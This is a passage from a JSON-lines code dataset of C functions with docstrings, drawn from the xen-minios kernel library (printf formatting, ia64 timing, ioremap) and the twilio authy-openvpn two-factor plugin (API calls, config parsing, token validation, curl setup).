flags |= SPECIAL; goto repeat;\n        case '0': flags |= ZEROPAD; goto repeat;\n        }\n\n        /* get field width */\n        field_width = -1;\n        if (isdigit(*fmt))\n            field_width = skip_atoi(&fmt);\n        else if (*fmt == '*') {\n            ++fmt;\n            /* it's the next argument */\n            field_width = va_arg(args, int);\n            if (field_width < 0) {\n                field_width = -field_width;\n                flags |= LEFT;\n            }\n        }\n\n        /* get the precision */\n        precision = -1;\n        if (*fmt == '.') {\n            ++fmt;\n            if (isdigit(*fmt))\n                precision = skip_atoi(&fmt);\n            else if (*fmt == '*') {\n                ++fmt;\n                          /* it's the next argument */\n                precision = va_arg(args, int);\n            }\n            if (precision < 0)\n                precision = 0;\n        }\n\n        /* get the conversion qualifier */\n        qualifier = -1;\n        if (*fmt == 'h' || *fmt == 'l' || *fmt == 'L' || *fmt =='Z') {\n            qualifier = *fmt;\n            ++fmt;\n            if (qualifier == 'l' && *fmt == 'l') {\n                qualifier = 'L';\n                ++fmt;\n            }\n        }\n        if (*fmt == 'q') {\n            qualifier = 'L';\n            ++fmt;\n        }\n\n        /* default base */\n        base = 10;\n\n        switch (*fmt) {\n        case 'c':\n            if (!(flags & LEFT)) {\n                while (--field_width > 0) {\n                    if (str <= end)\n                        *str = ' ';\n                    ++str;\n                }\n            }\n            c = (unsigned char) va_arg(args, int);\n            if (str <= end)\n                *str = c;\n            ++str;\n            while (--field_width > 0) {\n                if (str <= end)\n                    *str = ' ';\n                ++str;\n            }\n            continue;\n\n        case 's':\n            s = va_arg(args, char *);\n            if (!s)\n                s = \"<NULL>\";\n\n            len = strnlen(s, precision);\n\n            if (!(flags & LEFT)) {\n                while (len < field_width--) {\n                    if (str <= end)\n                        *str = ' ';\n                    ++str;\n                }\n            }\n            for (i = 0; i < len; ++i) {\n                if (str <= end)\n                    *str = *s;\n                ++str; ++s;\n            }\n            while (len < field_width--) {\n                if (str <= end)\n                    *str = ' ';\n                ++str;\n            }\n            continue;\n\n        case 'p':\n            if (field_width == -1) {\n                field_width = 2*sizeof(void *);\n                flags |= ZEROPAD;\n            }\n            str = number(str, end,\n                         (unsigned long) va_arg(args, void *),\n                         16, field_width, precision, flags);\n            continue;\n\n\n        case 'n':\n            if (qualifier == 'l') {\n                long * ip = va_arg(args, long *);\n                *ip = (str - buf);\n            } else if (qualifier == 'Z') {\n                size_t * ip = va_arg(args, size_t *);\n                *ip = (str - buf);\n            } else {\n                int * ip = va_arg(args, int *);\n                *ip = (str - buf);\n            }\n            continue;\n\n        case '%':\n            if (str <= end)\n                *str = '%';\n            ++str;\n            continue;\n\n            /* integer number formats - set up the flags and \"break\" */\n        case 'o':\n            base = 8;\n            break;\n\n        case 'X':\n            flags |= LARGE;\n        case 'x':\n            base = 16;\n            break;\n\n        case 'd':\n        case 'i':\n            flags |= SIGN;\n        case 'u':\n            break;\n\n        default:\n            if (str <= end)\n                *str = '%';\n            ++str;\n            if (*fmt) {\n                if (str <= end)\n                    *str = *fmt;\n                ++str;\n            } else {\n                --fmt;\n            }\n            continue;\n        }\n        if (qualifier == 'L')\n            num = va_arg(args, long long);\n        else if (qualifier == 'l') {\n            num = va_arg(args, unsigned long);\n            if (flags & SIGN)\n                num = (signed long) num;\n        } else if (qualifier == 'Z') {\n            num = va_arg(args, size_t);\n        } else if (qualifier == 'h') {\n            num = (unsigned short) va_arg(args, int);\n            if (flags & SIGN)\n                num = (signed short) num;\n        } else {\n            num = va_arg(args, unsigned int);\n            if (flags & SIGN)\n                num = (signed int) num;\n        }\n\n        str = number(str, end, num, base,\n                     field_width, precision, flags);\n    }\n    if (str <= end)\n        *str = '\\0';\n    else if (size > 0)\n        /* don't write out a null byte if the buf size is zero */\n        *end = '\\0';\n    /* the trailing null byte doesn't count towards the total\n     * ++str;\n     */\n    return str-buf;\n}", "path": "lib\\printf.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/*\n * Read the clock frequencies from pal and sal for calculating\n * the clock interrupt.\n */\n", "func_signal": "static void\ncalculate_frequencies(void)", "code": "{\n\tstruct ia64_sal_result sal_res;\n\tstruct ia64_pal_result pal_res;\n\n\tpal_res = ia64_call_pal_static(PAL_FREQ_RATIOS, 0, 0, 0);\n\tsal_res = ia64_sal_entry(SAL_FREQ_BASE, 0, 0, 0, 0, 0, 0, 0);\n\n\tif (sal_res.sal_status == 0 && pal_res.pal_status == 0) {\n\t\tprocessor_frequency =\n\t\t\tsal_res.sal_result[0] * (pal_res.pal_result[0] >> 32)\n\t\t\t\t/ (pal_res.pal_result[0] & ((1L << 32) - 1));\n\t\titc_frequency =\n\t\t\tsal_res.sal_result[0] * (pal_res.pal_result[2] >> 32)\n\t\t\t\t/ (pal_res.pal_result[2] & ((1L << 32) - 1));\n\t\tPRINT_BV(\"Reading clock frequencies:\\n\");\n\t\tPRINT_BV(\"  Platform clock frequency %ld Hz\\n\",\n\t\t\t       sal_res.sal_result[0]);\n\t\tPRINT_BV(\"  Processor ratio %ld/%ld, Bus ratio %ld/%ld, \"\n\t\t\t       \"  ITC ratio %ld/%ld\\n\",\n\t\t\t       pal_res.pal_result[0] >> 32,\n\t\t\t       pal_res.pal_result[0] & ((1L << 32) - 1),\n\t\t\t       pal_res.pal_result[1] >> 32,\n\t\t\t       pal_res.pal_result[1] & ((1L << 32) - 1),\n\t\t\t       pal_res.pal_result[2] >> 32,\n\t\t\t       pal_res.pal_result[2] & ((1L << 32) - 1));\n\n\t\tprintk(\"  ITC frequency %ld\\n\", itc_frequency);\n\t} else {\n\t\titc_frequency = 1000000000;\n\t\tprocessor_frequency = 0;\n\t\tprintk(\"Reading clock frequencies failed!!! Using: %ld\\n\",\n\t\t       itc_frequency);\n\t}\n}", "path": "arch\\ia64\\time.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/* use 'ABCDEF' instead of 'abcdef' */\n", "func_signal": "static char * number(char * buf, char * end, long long num, int base, int size, int precision, int type)", "code": "{\n    char c,sign,tmp[66];\n    const char *digits;\n    const char small_digits[] = \"0123456789abcdefghijklmnopqrstuvwxyz\";\n    const char large_digits[] = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n    int i;\n\n    digits = (type & LARGE) ? large_digits : small_digits;\n    if (type & LEFT)\n        type &= ~ZEROPAD;\n    if (base < 2 || base > 36)\n        return buf;\n    c = (type & ZEROPAD) ? '0' : ' ';\n    sign = 0;\n    if (type & SIGN) {\n        if (num < 0) {\n            sign = '-';\n            num = -num;\n            size--;\n        } else if (type & PLUS) {\n            sign = '+';\n            size--;\n        } else if (type & SPACE) {\n            sign = ' ';\n            size--;\n        }\n    }\n    if (type & SPECIAL) {\n        if (base == 16)\n            size -= 2;\n        else if (base == 8)\n            size--;\n    }\n    i = 0;\n    if (num == 0)\n        tmp[i++]='0';\n    else \n    {\n        /* XXX KAF: force unsigned mod and div. */\n        unsigned long long num2=(unsigned long long)num;\n        unsigned int base2=(unsigned int)base;\n        while (num2 != 0) { tmp[i++] = digits[num2%base2]; num2 /= base2; }\n    }\n    if (i > precision)\n        precision = i;\n    size -= precision;\n    if (!(type&(ZEROPAD+LEFT))) {\n        while(size-->0) {\n            if (buf <= end)\n                *buf = ' ';\n            ++buf;\n        }\n    }\n    if (sign) {\n        if (buf <= end)\n            *buf = sign;\n        ++buf;\n    }\n    if (type & SPECIAL) {\n        if (base==8) {\n            if (buf <= end)\n                *buf = '0';\n            ++buf;\n        } else if (base==16) {\n            if (buf <= end)\n                *buf = '0';\n            ++buf;\n            if (buf <= end)\n                *buf = digits[33];\n            ++buf;\n        }\n    }\n    if (!(type & LEFT)) {\n        while (size-- > 0) {\n            if (buf <= end)\n                *buf = c;\n            ++buf;\n        }\n    }\n    while (i < precision--) {\n        if (buf <= end)\n            *buf = '0';\n        ++buf;\n    }\n    while (i-- > 0) {\n        if (buf <= end)\n            *buf = tmp[i];\n        ++buf;\n    }\n    while (size-- > 0) {\n        if (buf <= end)\n            *buf = ' ';\n        ++buf;\n    }\n    return buf;\n}", "path": "lib\\printf.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/* Print the available memory chunks. */\n", "func_signal": "static void\nprint_phys_avail(void)", "code": "{\n\tint i;\n\n\tprintk(\"Physical memory chunk(s):\\n\");\n\tfor (i = 0; phys_avail[i + 1] != 0; i += 2) {\n\t\tint size = phys_avail[i + 1] - phys_avail[i];\n\t\tprintk(\"0x%08lx - 0x%08lx, %d bytes (%d pages)\\n\",\n\t\t\tphys_avail[i], phys_avail[i + 1] - 1,\n\t\t\tsize, size / PAGE_SIZE);\n\t}\n}", "path": "arch\\ia64\\mm.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/* This should be overridden by the application we are linked against. */\n", "func_signal": "__attribute__((weak)) int app_main(start_info_t *si)", "code": "{\n    printk(\"Dummy main: start_info=%p\\n\", si);\n    return 0;\n}", "path": "kernel.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/* Map a physical address range into virtual address space with provided\n * flags. Return a virtual address range it is mapped to. */\n", "func_signal": "static void *__do_ioremap(unsigned long phys_addr, unsigned long size, \n                          unsigned long prot)", "code": "{\n    unsigned long va;\n    unsigned long mfns, mfn;\n    unsigned long num_pages, offset;\n    int i;\n\n    /* allow non page aligned addresses but for mapping we need to align them */\n    offset = (phys_addr & ~PAGE_MASK);\n    num_pages = (offset + size + PAGE_SIZE - 1) / PAGE_SIZE;\n    phys_addr &= PAGE_MASK;\n    mfns = mfn = phys_addr >> PAGE_SHIFT;\n    \n    /* sanity checks on list of MFNs */\n    for ( i = 0; i < num_pages; i++, mfn++ )\n    {\n        if ( mfn_is_ram(mfn) )\n        {\n            printk(\"ioremap: mfn 0x%ulx is RAM\\n\", mfn);\n            goto mfn_invalid;\n        }\n    }   \n    va = (unsigned long)map_frames_ex(&mfns, num_pages, 0, 1, 1,\n                                      DOMID_IO, NULL, prot);\n    return (void *)(va + offset);\n    \nmfn_invalid:\n    return NULL;\n}", "path": "arch\\x86\\ioremap.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/*\n * monotonic_clock(): returns # of nanoseconds passed since time_init()\n */\n", "func_signal": "uint64_t\nmonotonic_clock(void)", "code": "{\n\tuint64_t delta;\n\n\tdelta = ia64_get_itc() - itc_at_boot;\n\tdelta = ns_from_cycles(delta);\n\treturn delta;\n}", "path": "arch\\ia64\\time.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/**\n * simple_strtoll - convert a string to a signed long long\n * @cp: The start of the string\n * @endp: A pointer to the end of the parsed string will be placed here\n * @base: The number base to use\n */\n", "func_signal": "long long simple_strtoll(const char *cp,char **endp,unsigned int base)", "code": "{\n    if(*cp=='-')\n        return -simple_strtoull(cp+1,endp,base);\n    return simple_strtoull(cp,endp,base);\n}", "path": "lib\\printf.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/**\n * snprintf - Format a string and place it in a buffer\n * @buf: The buffer to place the result into\n * @size: The size of the buffer, including the trailing null space\n * @fmt: The format string to use\n * @...: Arguments for the format string\n */\n", "func_signal": "int snprintf(char * buf, size_t size, const char *fmt, ...)", "code": "{\n    va_list args;\n    int i;\n\n    va_start(args, fmt);\n    i=vsnprintf(buf,size,fmt,args);\n    va_end(args);\n    return i;\n}", "path": "lib\\printf.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/**\n * sprintf - Format a string and place it in a buffer\n * @buf: The buffer to place the result into\n * @fmt: The format string to use\n * @...: Arguments for the format string\n */\n", "func_signal": "int sprintf(char * buf, const char *fmt, ...)", "code": "{\n    va_list args;\n    int i;\n\n    va_start(args, fmt);\n    i=vsprintf(buf,fmt,args);\n    va_end(args);\n    return i;\n}", "path": "lib\\printf.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/**\n * sscanf - Unformat a buffer into a list of arguments\n * @buf:\tinput buffer\n * @fmt:\tformatting of buffer\n * @...:\tresulting arguments\n */\n", "func_signal": "int sscanf(const char * buf, const char * fmt, ...)", "code": "{\n\tva_list args;\n\tint i;\n\n\tva_start(args,fmt);\n\ti = vsscanf(buf,fmt,args);\n\tva_end(args);\n\treturn i;\n}", "path": "lib\\printf.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "/* Un-map the io-remapped region. Currently no list of existing mappings is\n * maintained, so the caller has to supply the size */\n", "func_signal": "void iounmap(void *virt_addr, unsigned long size)", "code": "{   \n    unsigned long num_pages;\n    unsigned long va = (unsigned long)virt_addr;\n\n    /* work out number of frames to unmap */\n    num_pages = ((va & ~PAGE_MASK) + size + PAGE_SIZE - 1) / PAGE_SIZE;\n\n    unmap_frames(va & PAGE_MASK, num_pages);\n}", "path": "arch\\x86\\ioremap.c", "repo_name": "avsm/xen-minios", "stars": 184, "license": "other", "language": "c", "size": 3159}
{"docstring": "//\n// Description\n//\n// Calls the new user Authy API API\n//\n// Parameters\n//\n// pszApiUrl    - The server URL\n// pszPostFields  - POST fields if it's a POST request\n// pszEndPoint - The API endpoint including format\n// pszParams   - The endpoint params.\n// pszApiKey   - The Authy API key.\n//\n// Returns\n//\n// Standard RESULT\n//\n", "func_signal": "extern RESULT\nregisterUser(const char *pszApiUrl,\n              char *pszPostFields,\n              const char *pszApiKey,\n              char *pszResponse)", "code": "{\n  int r = FAIL;\n  char *pszResultUrl = NULL;\n  char *pszEndPoint = \"/users/new\";\n  char *pszParams = \"?api_key=\";\n\n  r = buildUrl(&pszResultUrl,\n               pszApiUrl,\n               pszEndPoint,\n               pszParams,\n               pszApiKey);\n\n  if(FAILED(r)){\n    goto EXIT;\n  }\n\n  r = doHttpRequest(pszResultUrl, pszPostFields, pszResponse);\n\n  // Clean memory used in the request\n  cleanAndFree(pszResultUrl);\n  pszResultUrl = NULL;\n\n  if(FAILED(r)){\n    trace(ERROR, __LINE__, \"[Authy] User Registration Failed\\n\");\n    goto EXIT;\n  }\n\n  r = OK;\n\nEXIT:\n  return r;\n}", "path": "src\\authy_api.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "// Description\n//\n// Checks if pszAuthyId is a valid authyId\n// by checking if it's a number only.\n//\n// Parameters\n// \n//   pszAuthyId - The Authy ID\n// \n// Returns\n// \n// 1 if it's a valid authy ID \n// 0 otherwie\n//\n", "func_signal": "static BOOL\nisAnAuthyId(char *pszAuthyId)", "code": "{\n  long long llAuthyId =  (long long)strtoll(pszAuthyId, (char **)NULL, 10);\n  if( 0 == llAuthyId){\n    trace(DEBUG, __LINE__, \"%s is not an Authy ID\\n\", pszAuthyId);\n    return 0;\n  }\n  return 1;\n}", "path": "src\\authy_conf.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "//\n// Description\n//\n// Allocates the memory and build the URL of the enpoind including\n// params.\n//\n// Parameters\n//\n// pResultUrl -  A pointer to the pointer were the URL will be stored.\n// pszApiUrl   - Server URL\n// pszEndPoint - The API endpoint including format\n// pszParams   - The endpoint params.\n// pszApiKey   - The Authy API key.\n//\n// Returns\n//\n// Standard RESULT\n//\n", "func_signal": "RESULT\nbuildUrl(__out char **ppszResultUrl,\n         const char *pszApiUrl,\n         const char *pszEndPoint,\n         const char *pszParams,\n         const char *pszApiKey)", "code": "{\n  assert(ppszResultUrl != NULL);\n\n  RESULT r = FAIL;\n\n  size_t urlSize = calcUrlSize(pszApiUrl,\n                               pszEndPoint,\n                               pszParams,\n                               pszApiKey);\n\n\n  *ppszResultUrl = calloc(urlSize, sizeof(char));\n  if(NULL == *ppszResultUrl){\n    trace(ERROR, __LINE__, \"[Authy] Out of Memory: Malloc failed.\");\n    r = OUT_OF_MEMORY;\n    goto EXIT;\n  }\n\n  snprintf(*ppszResultUrl,\n           urlSize,\n           \"%s%s%s%s\",\n           pszApiUrl, pszEndPoint, pszParams, pszApiKey);\n\n  trace(DEBUG, __LINE__, \"[Authy] buildUrl pszResultUrl=%s\\n.\", *ppszResultUrl);\n  r = OK;\n\nEXIT:\n  return r;\n}", "path": "src\\authy_api.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "// Description\n//\n// Extracts the Authy ID and common name from the configuration file \n//\n// Parameters\n//    \n//   ppszAuthyId     - A pointer to the pointer that will hold the authy id string\n//   ppszCommonName  - A pointer to the pointer that will hold the CommonName String \n//   pszConfFilename - Full path to the configuration file\n//   pszUsername     - The Username (login) for which we are getting the Authy ID\n//   pszCommonName   - Common name from the OpenVPN certificate\n//\n// Returns\n// \n// standard RESULT\n//\n", "func_signal": "RESULT\ngetAuthyIdAndCommonName(__out char **ppszAuthyId,\n                        __out char **ppszCommonName,\n                        const char *pszConfFilename, \n                        const char *pszUsername \n                        )", "code": "{\n  FILE *fpConfFile = NULL;\n\tchar *pch = NULL;\n\n  char line[LINE_LENGTH];\n  char *columns[3] = {NULL};\n  int i = 0;\n\n  RESULT r = FAIL;\n\n  if(!pszConfFilename){\n    r = FAIL;\n    trace(ERROR, __LINE__, \"[Authy] Wrong configuration filename.\\n\");\n    goto EXIT;\n  }\n\n  if(!pszUsername || FAILED(checkUsername(pszUsername)) ) {\n    r = FAIL;\n    trace(ERROR, __LINE__, \"[Authy] Username is invalid. Either empty or not a valid unix username.\\n\");\n    goto EXIT;\n  }\n\n  fpConfFile = fopen(pszConfFilename, \"r\");\n\n  if(NULL == fpConfFile) {\n\t\ttrace(ERROR, __LINE__, \"[Authy] Unable to read authy config file: %s.\\n\", pszConfFilename);\n    trace(ERROR, __LINE__, \"[Authy] Error %d: %s\\n\", errno, strerror(errno));\n    r = FAIL;\n    goto EXIT;\n  }\n\n  memset(columns, 0, sizeof(columns));\n  while(NULL != fgets(line, ARRAY_SIZE(line), fpConfFile)){\n\t\tpch = strtok(line,\" \\t\");\n    i = 0;\n    while(pch != NULL && i < 3){\n      columns[i] = removeSpaces(pch);\n      pch = strtok (NULL, \" \\t\"); //Go to the next token \n      i++;\n    }    \n    if(0 == strcasecmp(columns[0], pszUsername)){\n      trace(DEBUG, __LINE__, \"[Authy] Found column for pszUsername=%s column is %s\\n\", pszUsername, line); \n      break; \n    }\n    memset(columns, 0, sizeof(columns));\n  }\n\n  if(columns[0] == NULL){\n    r = FAIL;\n    if (ALLOW_NON_TWO_FACTOR_LOGINS){\n      r = OK;\n    }\n    trace(ERROR, __LINE__, \"[Authy] Username %s was not found in Authy Config file.\\n\", pszUsername);\n    goto EXIT;\n  } \n  \n  if(columns[1] == NULL || isAnAuthyId(columns[1])== FALSE ){\n    r = FAIL;\n    trace(ERROR, __LINE__, \"[Authy] AuthyID %s for Username %s is not valid. Authy ID's can only be numeric values\\n\", columns[1], pszUsername);\n    goto EXIT;\n  }\n  \n  trace(INFO, __LINE__, \"[Authy] Found Authy ID: %s for username: %s\\n\", columns[1], pszUsername);\n\n  *ppszAuthyId = strdup(columns[1]);\n  if(!*ppszAuthyId){\n    r = FAIL;\n    trace(ERROR, __LINE__, \"[Authy] Unable to allocate memory to copy AuthyID.\\n\");\n    goto EXIT;\n  }\n\n  \n  if(columns[2]){\n    *ppszCommonName = strdup(columns[2]);\n    if(!*ppszCommonName){\n      trace(ERROR, __LINE__, \"[Authy] Unable to allocate memory to copy CommonName.\\n\");\n    }\n  }\n\n  r = OK;\n\nEXIT:\n  if(fpConfFile){\n    fclose(fpConfFile);\n  }\n  return r;\n}", "path": "src\\authy_conf.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "// Description\n//\n//  Goes through the response body looking for success. Else assumes failure\n//\n// Parameters\n//\n//   pszRespone           - Response body in json format\n//\n// Returns\n//\n// Standard RESULT\n//\n", "func_signal": "static RESULT\nresponseWasSuccessful(char *pszAuthyResponse)", "code": "{\n  int cnt;\n  jsmn_parser parser;\n  jsmn_init(&parser);\n  jsmntok_t tokens[20];\n  jsmn_parse(&parser, pszAuthyResponse, tokens, 20);\n\n  /* success isn't always on the same place, look until 19 because it\n     shouldn't be the last one because it won't be a key */\n  for (cnt = 0; cnt < 19; ++cnt)\n  {\n    if(strncmp(pszAuthyResponse + (tokens[cnt]).start, \"success\", (tokens[cnt]).end - (tokens[cnt]).start) == 0)\n    {\n      if(strncmp(pszAuthyResponse + (tokens[cnt+1]).start, \"true\", (tokens[cnt+1]).end - (tokens[cnt+1]).start) == 0){\n        return OK;\n      } else {\n        return FAIL;\n      }\n    }\n  }\n\treturn FAIL;\n}", "path": "src\\authy_openvpn.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "///\n// Description\n//\n// Calls the request SMS Authy API.\n//\n//\n// Parameters\n//\n// pszApiUrl      - The server URL\n// pszAuthyId     - The Authy ID fo the user\n// pszVia         - This is the way, either 'call' or 'sms'\n// pszApiKey      - The Authy API key\n// pszResponse    - Pointer to where the response will be stored.\n//\n// Returns\n//\n// Standard RESULT\n//\n", "func_signal": "extern RESULT\nsendTokenToUser(const char *pszApiUrl,\n            char *pszAuthyId,\n            char *pszVia,\n            const char *pszApiKey,\n            char *pszResponse)", "code": "{\n  int r = FAIL;\n  size_t endPointSize = 0;\n  char *pszResultUrl = NULL;\n  char *pszEndPoint = NULL;\n  char *pszParams = \"?api_key=\";\n\n  // /call/1 or /sms/1. Including the 2 slashes.\n  endPointSize = 2 + strlen(pszVia) + strlen(pszAuthyId) + 1;\n  pszEndPoint = calloc(endPointSize, sizeof(char));\n  if(NULL == pszEndPoint){\n    r = OUT_OF_MEMORY;\n    goto EXIT;\n  }\n\n  snprintf(pszEndPoint, endPointSize, \"/%s/%s\", pszVia, pszAuthyId);\n  r = buildUrl(&pszResultUrl,\n               pszApiUrl,\n               pszEndPoint,\n               pszParams,\n               pszApiKey);\n\n  if(FAILED(r)) {\n    r = FAIL;\n    goto EXIT;\n  }\n\n  trace(INFO, __LINE__, \"[Authy] Requesting %sfor Authy ID\\n\", pszVia, pszAuthyId);\n  r = doHttpRequest(pszResultUrl, NULL, pszResponse);\n\nEXIT:\n  cleanAndFree(pszResultUrl);\n  pszResultUrl = NULL;\n  cleanAndFree(pszEndPoint);\n  pszEndPoint = NULL;\n\n  return r;\n}", "path": "src\\authy_api.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "// Description\n//\n// Validates that the given common name in the certificate\n// matches the common name for the user in the config file.\n// \n// Parameters\n// \n//   pszCommonName  - The common name on the certificate. \n//   pszWantedCommonName - The common name on the config file \n//\n// Returns\n// \n// Standard RESULT\n//\n", "func_signal": "RESULT\nvalidateCommonName(const char *pszCommonName, \n                   const char *pszWantedCommonName\n                  )", "code": "{\n\n  RESULT r = FAIL;\n\n  if(pszCommonName != NULL && strcmp(pszCommonName, pszWantedCommonName) == 0){\n    r = OK;\n    trace(ERROR, __LINE__, \"[Authy] CommonName validation succeeded\\n\");\n  }\n  else{\n    trace(ERROR, __LINE__, \"[Authy] CommonName %s does not match the configuration file common name %s\\n\", pszCommonName, pszWantedCommonName);\n  }\n\n  return r;\n}", "path": "src\\authy_conf.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "//\n// Description\n//\n// curl custom writer. Implements the prototype:\n// prototype: size_t function( char *ptr, size_t size, size_t nmemb, void *userdata);\n//\n// Parameters\n//\n// ptr         - Rough data with size size * nmemb. Not zero terminated\n// size        - size of each member of ptr\n// nmemb       - number of members\n// userdata    - pointer to were the date is written too. Max write is CURL_MAX_WRITE_SIZE\n//               We allocate userdate 0 termited from the start.\n//\n// Returns\n//\n// Ammount of data that was written to userdata. Else curl will raise an\n// error.\n//\n//\n", "func_signal": "static size_t\ncurlWriter(char *ptr,\n             size_t size,\n             size_t nmemb,\n             void *userdata)", "code": "{\n  memcpy(userdata, ptr, (size_t) size * nmemb);\n  return nmemb*size;\n}", "path": "src\\authy_api.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "// Description\n//\n// Takes a token String entered by the end user and sanitizes\n// the input to make sure it's only numeric and is less than\n// 12 characters.\n//\n// Parameters\n//\n//   pszString - A NULL terminated string\n//\n// Returns\n//\n//   The sanitized token String.\n//\n", "func_signal": "BOOL\nisTokenSafe(char *pszToken)", "code": "{\n  size_t len = strlen(pszToken);\n  BOOL isNumeric = TRUE;\n\n  int i;\n  for(i = 0; i < len; i++)\n  {\n    if(0 == isdigit(pszToken[i]))\n    {\n      isNumeric = FALSE;\n    }\n  }\n\n  if(isNumeric && len >= MIN_TOKEN_LENGTH && len <= MAX_TOKEN_LENGTH) {\n    return TRUE;\n  }\n\n  if(FALSE == isNumeric)\n  {\n    trace(INFO, __LINE__, \"[Authy] Possible hack attempt, token is not numeric\\n\");\n  }\n\n  trace(INFO, __LINE__, \"[Authy] Token length is invalid: %i\\n\", len);\n  return FALSE;\n}", "path": "src\\utils.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "// Description\n//\n// Given an environmental variable name, search\n// the envp array for its value, returning it\n//\n// Parameters\n//\n//   name            - Name of the enviromental\n//   envp            - The environment\n//\n// Returns\n//\n// The value of the env variable or NULL otherwise\n// if not found\n//\n/*\n * Given an environmental variable name, search\n * the envp array for its value, returning it\n * if found or NULL otherwise.\n * From openvpn/sample/sample-plugins/defer/simple.c\n */\n", "func_signal": "static char *\ngetEnv(const char *name, const char *envp[])", "code": "{\n  if (envp)\n  {\n    int i;\n    const int nameLength = strlen(name);\n    for (i = 0; envp[i]; ++i)\n    {\n      if (!strncmp (envp[i], name, nameLength))\n      {\n        const char *cp = envp[i] + nameLength;\n        if (*cp == '=')\n          return (char *) cp + 1;\n      }\n    }\n  }\n  return NULL;\n}", "path": "src\\authy_openvpn.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "///\n// Description\n//\n// Calls the request SMS Authy API.\n//\n//\n// Parameters\n//\n// pszApiUrl      - The server URL\n// pszAuthyId     - The Authy ID fo the user\n// pszApiKey      - The Authy API key\n// pszResponse    - Pointer to where the response will be stored.\n//\n// Returns\n//\n// Standard RESULT\n//\n", "func_signal": "extern RESULT\nsms(const char *pszApiUrl,\n          char *pszAuthyId,\n    const char *pszApiKey,\n          char *pszResponse)", "code": "{\n  int r = FAIL;\n\n  char *pszVia = \"sms\";\n  r = sendTokenToUser(pszApiUrl,\n                      pszAuthyId,\n                      pszVia,\n                      pszApiKey,\n                      pszResponse);\n\n  if (FAILED(r)){\n    trace(ERROR, __LINE__, \"[AUTHY] Error sendingsms token to user\\n\");\n    r = FAIL;\n    goto EXIT;\n  }\n\n  r = OK;\n\nEXIT:\n  return r;\n}", "path": "src\\authy_api.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "///\n// Description\n//\n// Calls the request call Authy API.\n//\n//\n// Parameters\n//\n// pszApiUrl      - The server URL\n// pszAuthyId     - The Authy ID fo the user\n// pszApiKey      - The Authy API key\n// pszResponse    - Pointer to where the response will be stored.\n//\n// Returns\n//\n// Standard RESULT\n//\n", "func_signal": "extern RESULT\ncall(const char *pszApiUrl,\n            char *pszAuthyId,\n            const char *pszApiKey,\n            char *pszResponse)", "code": "{\n  int r = FAIL;\n\n  char *pszVia = \"call\";\n  r = sendTokenToUser(pszApiUrl,\n                      pszAuthyId,\n                      pszVia,\n                      pszApiKey,\n                      pszResponse);\n\n  if (FAILED(r)){\n    trace(ERROR, __LINE__, \"[AUTHY] Error trying to call the user\\n\");\n    r = FAIL;\n    goto EXIT;\n  }\n\n  r = OK;\n\nEXIT:\n  return r;\n}", "path": "src\\authy_api.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "//\n// Description\n//\n// Handles the http request to the api\n// it knows when to do a GET or a POST based\n// on the present of pszPostFields\n//\n// Parameters\n//\n// pszResultUrl         - The full URL\n// pszPostFields  - POST fields if it's a POST request or NULL for GET request\n// pszEndPoint - The API endpoint including format\n// pszParams   - The endpoint params.\n// pszApiKey   - The Authy API key.\n//\n// Returns\n//\n// Standard RESULT\n//\n", "func_signal": "RESULT\ndoHttpRequest(char *pszResultUrl, char *pszPostFields, char *pszResponse)", "code": "{\n  RESULT r = FAIL;\n  CURL *pCurl = NULL;\n  int curlResult = -1;\n  char *pszUserAgent = NULL;\n\n  pszUserAgent = getUserAgent();\n  if(NULL == pszUserAgent)\n  {\n    trace(ERROR, __LINE__, \"[Authy] Cannot get user agent. Setting user agent to unkown.\");\n\n    pszUserAgent = calloc(strlen(UNKNOWN_VERSION_AGENT) + 1, sizeof(char));\n    if(pszUserAgent == NULL)\n    {\n      trace(ERROR, __LINE__, \"[Authy] Failed to set user agent. Could not allocate memory for user agent.\");\n      goto EXIT;\n    }\n    pszUserAgent = strncpy(pszUserAgent, UNKNOWN_VERSION_AGENT, strlen(UNKNOWN_VERSION_AGENT));\n  }\n\n  curl_global_init(CURL_GLOBAL_ALL);\n\n  pCurl = curl_easy_init();\n  if(!pCurl){\n    r = FAIL;\n    trace(ERROR, __LINE__, \"[Authy] CURL failed to initialize\");\n    goto EXIT;\n  }\n\n  